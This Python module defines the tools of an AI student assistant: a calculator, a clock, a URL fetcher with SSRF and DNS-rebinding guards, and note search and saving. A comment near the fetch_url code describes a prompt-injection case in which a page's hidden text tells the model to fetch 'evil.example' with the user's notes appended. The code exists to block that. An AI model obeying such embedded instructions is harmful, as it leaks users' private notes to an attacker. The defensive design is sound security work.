"""The five built-in tools. Note which layers each one touches:

  search_notes     -> knowledge layer (which itself calls inference for embeddings)
  save_note        -> knowledge layer (stores a private note for this session)
  calculator       -> pure computation, no other layer
  current_datetime -> pure computation
  fetch_url        -> external I/O (and the knowledge layer's PDF reader, for PDF links)
"""

import ast
import asyncio
import contextvars
import ipaddress
import math
import operator
import re
import socket
from datetime import datetime, timezone
from zoneinfo import ZoneInfo, ZoneInfoNotFoundError

import httpx

from app.config import get_settings
from app.inference.provider import LLMProvider
from app.knowledge.ingest import slugify
from app.knowledge.retrieval import current_session, get_store, retrieve
from app.knowledge.store import VectorStore
from app.knowledge.uploads import MAX_UPLOAD_CHARS, UPLOAD_TTL_S, UploadError, pdf_text, store_private_note
from app.tools.registry import Tool, ToolRegistry

# ---- calculator: a safe arithmetic evaluator (no eval()) --------------------

_BIN_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod,
    ast.Pow: operator.pow,
}
_UNARY_OPS = {ast.UAdd: operator.pos, ast.USub: operator.neg}
# About 1,200 digits: more than any real calculation needs, and small enough
# that every step is instant. The tool runs on the event loop, so an
# unbounded 9**9**9 would stall every other chat while it computed.
_MAX_INT_BITS = 4000
# A "%" with no number or "(" after it is a percentage (17% -> 17/100);
# one between two operands is modulo (10 % 3, 10 % -3).
_PERCENT_RE = re.compile(r"%(?!\s*[-+]?[\d.(])")


def _real(value: float) -> float:
    """value, if it's a finite real number. The result goes back to the model
    as JSON, which has no inf, nan or complex numbers, and one that can't be
    sent stays in the chat's history and breaks every later message."""
    if isinstance(value, complex):  # (-8)**(1/3)
        raise ValueError("result isn't a real number")
    if isinstance(value, float) and not math.isfinite(value):  # 1e308*10, 1e999
        raise ValueError("result too large")
    return value


def _eval_node(node: ast.AST) -> float:
    if isinstance(node, ast.Expression):
        return _eval_node(node.body)
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return _real(node.value)
    if isinstance(node, ast.BinOp) and type(node.op) in _BIN_OPS:
        left, right = _eval_node(node.left), _eval_node(node.right)
        if isinstance(node.op, ast.Pow) and isinstance(left, int) and isinstance(right, int):
            # Check before computing: the power itself is the slow part.
            # (|left| >= 2, so right alone past the limit is already too big.)
            if abs(left) > 1 and (right > _MAX_INT_BITS or right * math.log2(abs(left)) > _MAX_INT_BITS):
                raise ValueError("result too large")
        result = _BIN_OPS[type(node.op)](left, right)
        if isinstance(result, int) and result.bit_length() > _MAX_INT_BITS:
            raise ValueError("result too large")
        return _real(result)
    if isinstance(node, ast.UnaryOp) and type(node.op) in _UNARY_OPS:
        return _UNARY_OPS[type(node.op)](_eval_node(node.operand))
    raise ValueError(f"unsupported expression: {ast.dump(node)}")


def calculator(expression: str) -> dict:
    cleaned = _PERCENT_RE.sub("/100", expression.replace(",", "").replace("^", "**"))
    tree = ast.parse(cleaned, mode="eval")
    return {"expression": expression, "result": _eval_node(tree)}


# ---- current_datetime -------------------------------------------------------

# The user's IANA time zone for this turn, which the web client sends with
# each message. The agent sets it; None means the server's own zone, which on
# a cloud host is usually UTC, a day off for much of the world around midnight.
user_timezone: contextvars.ContextVar[str | None] = contextvars.ContextVar(
    "user_timezone", default=None
)


def _zone(name: str | None) -> ZoneInfo | None:
    if not name:
        return None
    try:
        return ZoneInfo(name)
    except (ZoneInfoNotFoundError, ValueError):
        return None  # unknown or malformed: fall back to the server's zone


def current_datetime() -> dict:
    zone = _zone(user_timezone.get())
    now = datetime.now(zone) if zone else datetime.now().astimezone()
    return {
        "iso": now.isoformat(timespec="seconds"),
        "weekday": now.strftime("%A"),
        "timezone": str(zone) if zone else now.tzname(),
        "utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
    }


# ---- fetch_url ----------------------------------------------------------------

# Plenty of HTML to find max_chars of text in; reading stops here so a huge
# or endless response can't fill the server's memory.
MAX_FETCH_BYTES = 2 * 1024 * 1024
# A PDF can't be read from a prefix (its index is at the end), and lecture
# slides with images are often several MB, so PDFs get a bigger cap.
MAX_FETCH_PDF_BYTES = 10 * 1024 * 1024
# Anything else (images, zips, audio) used to be decoded as text: garbage.
_TEXT_TYPES = ("text/", "application/xhtml+xml", "application/xml", "application/json")
MAX_FETCH_REDIRECTS = 5
FETCH_DEADLINE_S = 20.0  # for the whole fetch; httpx's timeout is per read

# A <script>/<style> tag, any other tag, or a word. None of them scans past a
# "<", so an unclosed tag stops at the next one instead of rescanning to the
# end of the page (a backtracking regex took minutes on 2 MB of <script>s).
_HTML_TOKEN_RE = re.compile(
    r"(?P<block><(?P<close>/?)(?P<name>script|style)\b[^<>]*>)|(?P<tag><[^<>]*>)|(?P<word><?[^<\s]+)",
    re.I,
)


def _visible_text(html: str, max_chars: int) -> str:
    """Up to max_chars of the page's words, minus tags, scripts and styles.
    One left-to-right pass that stops once it has enough, so its time and
    memory don't grow with the page. An unclosed <script> hides the rest of the
    page, as it does in a browser."""
    words: list[str] = []
    length, open_block = 0, None
    for m in _HTML_TOKEN_RE.finditer(html):
        if m["block"]:
            name = m["name"].lower()
            if open_block is None and not m["close"]:
                open_block = name
            elif open_block == name and m["close"]:
                open_block = None
        elif m["word"] and open_block is None:
            words.append(m["word"])
            length += len(m["word"]) + 1
            if length > max_chars:
                break
    return " ".join(words)[:max_chars]


def _is_public(ip: str) -> bool:
    addr = ipaddress.ip_address(ip.split("%", 1)[0])  # drop an IPv6 zone id
    if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:
        addr = addr.ipv4_mapped
    return addr.is_global


def _refuse_private(ip: str, host: str) -> None:
    if not _is_public(ip):
        raise ValueError(f"{host} is a private or local address; only public web pages can be fetched")


async def _resolve(host: str, port: int | None) -> list[str]:
    try:
        infos = await asyncio.get_running_loop().getaddrinfo(host, port, type=socket.SOCK_STREAM)
    except socket.gaierror as exc:
        raise ValueError(f"couldn't resolve {host}") from exc
    return [sockaddr[0] for *_, sockaddr in infos]


async def _public_address(url: httpx.URL) -> str:
    """The address to connect to for `url`, once every address its host
    resolves to has been checked as public. The server can reach places a
    visitor can't (itself, its host's private network, cloud metadata
    endpoints), and fetch_url must not become a way in. The caller connects to
    exactly this address: letting httpx look the host up again allowed DNS
    rebinding, a second answer naming a private address, and a GET went there
    before the old check on the connected peer could refuse the response."""
    if url.scheme not in ("http", "https") or not url.host:
        raise ValueError("only absolute http(s) URLs can be fetched")
    addresses = await _resolve(url.raw_host.decode("ascii"), url.port)
    for ip in addresses:
        _refuse_private(ip, url.host)
    return addresses[0]


async def _read_capped(response: httpx.Response, limit: int) -> bytes:
    body = bytearray()
    async for chunk in response.aiter_bytes():
        body += chunk
        if len(body) >= limit:
            break
    del body[limit:]
    return bytes(body)


_OCTET_TYPES = ("application/octet-stream", "binary/octet-stream")


def _content_type(response: httpx.Response) -> str:
    return response.headers.get("content-type", "").split(";")[0].strip().lower()


def _may_be_pdf(url: httpx.URL, response: httpx.Response) -> bool:
    """Whether the body could be a PDF, so it's read with the PDF cap. Whether
    it is one is decided by its first bytes: servers send PDFs as generic
    downloads, and a login page can sit at a .pdf address."""
    kind = _content_type(response)
    return (kind == "application/pdf" or kind in _OCTET_TYPES
            or (url.path.lower().endswith(".pdf") and not kind.startswith(_TEXT_TYPES)))


def _refuse_binary(url: httpx.URL, response: httpx.Response) -> None:
    kind = _content_type(response)
    if kind and not kind.startswith(_TEXT_TYPES) and not _may_be_pdf(url, response):
        raise ValueError(f"that link is {kind}, not a web page, text or PDF, so it can't be read")


async def _get_public_page(url: httpx.URL) -> tuple[httpx.URL, httpx.Response, bytes]:
    """The final URL after redirects, its response and up to a cap of its body.
    Redirects are followed by hand so every hop gets the address check, and
    trust_env=False connects directly rather than through a proxy."""
    async with httpx.AsyncClient(timeout=15, trust_env=False) as client:
        for _ in range(MAX_FETCH_REDIRECTS + 1):
            address = await _public_address(url)
            async with client.stream(
                "GET",
                url.copy_with(host=address),  # the checked address: no second DNS lookup
                headers={"User-Agent": "AI_Student_Assistant/0.1", "Host": url.netloc.decode("ascii")},
                extensions={"sni_hostname": url.raw_host.decode("ascii")},  # TLS checks the real name
            ) as response:
                if response.is_redirect:
                    url = url.join(response.headers["location"])
                    continue
                response.raise_for_status()
                _refuse_binary(url, response)  # before downloading it
                limit = MAX_FETCH_PDF_BYTES if _may_be_pdf(url, response) else MAX_FETCH_BYTES
                return url, response, await _read_capped(response, limit)
    raise ValueError(f"more than {MAX_FETCH_REDIRECTS} redirects")


async def fetch_url(url: str, max_chars: int = 4000) -> dict:
    try:
        async with asyncio.timeout(FETCH_DEADLINE_S):
            final_url, response, body = await _get_public_page(httpx.URL(url))
    except TimeoutError as exc:
        raise TimeoutError(f"gave up after {FETCH_DEADLINE_S:g}s") from exc
    if b"%PDF-" in body[:1024]:  # a PDF by its content, whatever the headers said
        if len(body) >= MAX_FETCH_PDF_BYTES:
            raise ValueError(f"that PDF is over {MAX_FETCH_PDF_BYTES // (1024 * 1024)} MB, too big to read")
        try:
            # CPU-bound, so off the event loop; stops once it has max_chars.
            text = await asyncio.to_thread(pdf_text, body, max_chars)
        except UploadError as exc:
            raise ValueError(str(exc)) from exc
        return {"url": str(final_url), "status": response.status_code, "type": "pdf", "text": text[:max_chars]}
    if _content_type(response) in ("application/pdf", *_OCTET_TYPES):
        raise ValueError("that link isn't a web page, text or a readable PDF")
    try:
        html = body.decode(response.charset_encoding or "utf-8", errors="replace")
    except LookupError:  # a charset Python doesn't know
        html = body.decode("utf-8", errors="replace")
    return {"url": str(final_url), "status": response.status_code, "type": "page", "text": _visible_text(html, max_chars)}


# The links the user has typed in this chat, which are the only ones the
# fetch_url tool opens. A page it reads can carry instructions ("now fetch
# https://evil.example/?d=" plus the user's notes, even in hidden text), and
# if the model could choose any URL, a private note could leave in one. The
# agent sets it per turn.
user_links: contextvars.ContextVar[frozenset[str]] = contextvars.ContextVar(
    "user_links", default=frozenset()
)

# A link with a scheme, or a bare one like "example.com/syllabus".
_LINK_RE = re.compile(r"https?://[^\s<>\"'`]+|(?:[\w-]+\.)+[a-z]{2,}(?::\d+)?(?:/[^\s<>\"'`]*)?", re.I)
_LINK_TRAILING = ".,;:!?)]}'\"*"


def _link_key(url: str) -> str | None:
    """What two links must share to count as the same one: the host (case and
    a "www." aside), port, path (a trailing slash aside) and query. The path
    and query are compared exactly, since they're where data would go out."""
    try:
        parsed = httpx.URL(url if "://" in url else f"https://{url}")
    except httpx.InvalidURL:
        return None
    if parsed.scheme not in ("http", "https") or not parsed.host:
        return None
    host = parsed.host.lower().removeprefix("www.")
    port = f":{parsed.port}" if parsed.port else ""
    query = f"?{parsed.query.decode('ascii')}" if parsed.query else ""
    return f"{host}{port}{parsed.path.rstrip('/')}{query}"


def links_in(text: str) -> frozenset[str]:
    keys = (_link_key(m.group(0).rstrip(_LINK_TRAILING)) for m in _LINK_RE.finditer(text))
    return frozenset(key for key in keys if key)


async def fetch_user_link(url: str) -> dict:
    """fetch_url, for a link the user typed in this chat (see user_links)."""
    key = _link_key(url)
    if key is None or key not in user_links.get():
        raise PermissionError(
            "only links the user typed in this chat can be opened, not ones the model or a page "
            "came up with; ask the user to paste the link if they want it read"
        )
    return await fetch_url(url)


# ---- search_notes / read_note / save_note ---------------------------------------

MAX_SEARCH_RESULTS = 10
# read_note returns a note this many characters at a time. A page stays in
# the chat's history and is resent on every later model call, so a whole
# 200,000-character note in one result would make each call huge.
READ_PAGE_CHARS = 8000


def _pages(text: str, size: int = READ_PAGE_CHARS) -> list[str]:
    """text as pages of at most `size` characters, broken between paragraphs
    so a page doesn't stop mid-sentence; a paragraph longer than a page is
    cut where it must be."""
    pages: list[str] = []
    current = ""
    for paragraph in text.split("\n\n"):
        while len(paragraph) > size:
            if current:
                pages.append(current)
                current = ""
            pages.append(paragraph[:size])
            paragraph = paragraph[size:]
        candidate = f"{current}\n\n{paragraph}" if current else paragraph
        if len(candidate) > size:
            pages.append(current)
            current = paragraph
        else:
            current = candidate
    if current or not pages:
        pages.append(current)
    return pages


def _note_id(store: VectorStore, session_id: str | None, title: str) -> str:
    """The doc_id for a note titled `title` among the session's notes. Saving
    under an existing title overwrites that note; a different title that
    slugifies the same ("C notes" vs "C++ notes") gets the next free "-2",
    "-3"... suffix instead, and so does one named like a shared note."""
    slug = slugify(title)
    shared = {d["doc_id"] for d in store.list_docs()}
    n = 1
    while True:
        doc_id = slug if n == 1 else f"{slug}-{n}"
        if doc_id not in shared:
            heading = store.first_line(doc_id, owner=session_id)
            if heading is None or heading.lstrip("#").strip().casefold() == title.casefold():
                return doc_id
        n += 1


def build_registry(provider: LLMProvider, store: VectorStore | None = None) -> ToolRegistry:
    """Wire tools to the provider/store they need. Keeping this a factory (rather
    than module-level globals) is what lets tests inject a FakeProvider."""
    settings = get_settings()
    store = store or get_store()
    registry = ToolRegistry()

    async def search_notes(query: str, top_k: int = settings.retrieval_top_k) -> dict:
        # The model picks top_k, and every passage returned is replayed to it on
        # later turns: a huge one could overflow its context for good, and a
        # negative one used to return all but the last few passages.
        top_k = min(max(int(top_k), 1), MAX_SEARCH_RESULTS)
        chunks = await retrieve(query, provider, store, k=top_k)
        return {
            "query": query,
            "results": [
                {"doc_id": c.doc_id, "score": c.score, "text": c.text} for c in chunks
            ],
        }

    def read_note(doc_id: str, page: int = 1) -> dict:
        # The same notes a search sees: the shared ones and this session's own.
        text = store.note_text(doc_id, owner=current_session.get())
        if text is None:
            raise ValueError(f"no note has the doc_id {doc_id!r}; take one from search_notes results")
        pages = _pages(text)
        page = int(page)
        if not 1 <= page <= len(pages):
            raise ValueError(f"page {page} doesn't exist; the note has {len(pages)} page(s)")
        return {"doc_id": doc_id, "page": page, "pages_total": len(pages), "text": pages[page - 1]}

    async def save_note(title: str, content: str) -> dict:
        # A private note, like an upload. The shared notes are the same for
        # every visitor, so a note saved there could be read, and overwritten,
        # by anyone using the app.
        session_id = current_session.get()
        if len(content) > MAX_UPLOAD_CHARS:  # the same cap as an uploaded file's text
            raise ValueError(f"notes can hold up to {MAX_UPLOAD_CHARS:,} characters")
        title = " ".join(title.split())  # one line, so it stays the note's "# Title"
        doc_id = _note_id(store, session_id, title)
        text = f"# {title}\n\n{content.strip()}\n"
        return await store_private_note(session_id, doc_id, text, store, provider)

    registry.register(
        Tool(
            "search_notes",
            "Semantic search over the user's personal notes. Use this whenever the "
            "user asks about their notes, plans, lists, recipes, or anything they "
            "may have written down. Returns the most relevant passages with doc_ids.",
            {
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "What to search for."},
                    "top_k": {
                        "type": "integer",
                        "minimum": 1,
                        "maximum": MAX_SEARCH_RESULTS,
                        "description": f"Number of passages (default {settings.retrieval_top_k}, "
                        f"at most {MAX_SEARCH_RESULTS}).",
                    },
                },
                "required": ["query"],
            },
            search_notes,
        )
    )
    registry.register(
        Tool(
            "read_note",
            "Read one of the user's notes in full, a page (up to "
            f"{READ_PAGE_CHARS:,} characters) at a time. search_notes returns only a few "
            "passages, so use this when a question needs more of a note than that: "
            "summaries, quizzes, 'list every...' questions, or anything spanning several "
            "sections. Take the doc_id from search_notes results. The result gives "
            "pages_total; read every page (several at once is fine) before answering.",
            {
                "type": "object",
                "properties": {
                    "doc_id": {"type": "string", "description": "The note's doc_id, from search_notes."},
                    "page": {"type": "integer", "minimum": 1, "description": "Which page (default 1)."},
                },
                "required": ["doc_id"],
            },
            read_note,
        )
    )
    registry.register(
        Tool(
            "save_note",
            "Save a private note for this user, or overwrite their note with the same "
            "title, and index it so it becomes searchable. Only this user's chat can see "
            f"it, and it lasts until they start a new session or for {UPLOAD_TTL_S // 3600} "
            "hours. Use when the user asks to save, remember, or write down something.",
            {
                "type": "object",
                "properties": {
                    "title": {"type": "string", "description": "Short title for the note."},
                    "content": {"type": "string", "description": "Markdown body of the note."},
                },
                "required": ["title", "content"],
            },
            save_note,
        )
    )
    registry.register(
        Tool(
            "calculator",
            "Evaluate an arithmetic expression exactly (+ - * / ** and parentheses; "
            "'17%' is a percentage, '10 % 3' is modulo). Use for any non-trivial "
            "arithmetic instead of computing in your head.",
            {
                "type": "object",
                "properties": {
                    "expression": {"type": "string", "description": "e.g. '0.17 * 2340' or '(3+4)**2'"}
                },
                "required": ["expression"],
            },
            calculator,
        )
    )
    registry.register(
        Tool(
            "current_datetime",
            "Get the current date, time, and weekday in the user's time zone. Use for "
            "anything involving 'today', 'now', deadlines, or elapsed time.",
            {"type": "object", "properties": {}},
            current_datetime,
        )
    )
    registry.register(
        Tool(
            "fetch_url",
            "Fetch a public web page or PDF and return its visible text (truncated). Only "
            "opens links the user has typed in this chat; use it when they give one or ask "
            "about a page or PDF they linked.",
            {
                "type": "object",
                "properties": {"url": {"type": "string", "description": "A link exactly as the user gave it."}},
                "required": ["url"],
            },
            fetch_user_link,
        )
    )
    return registry
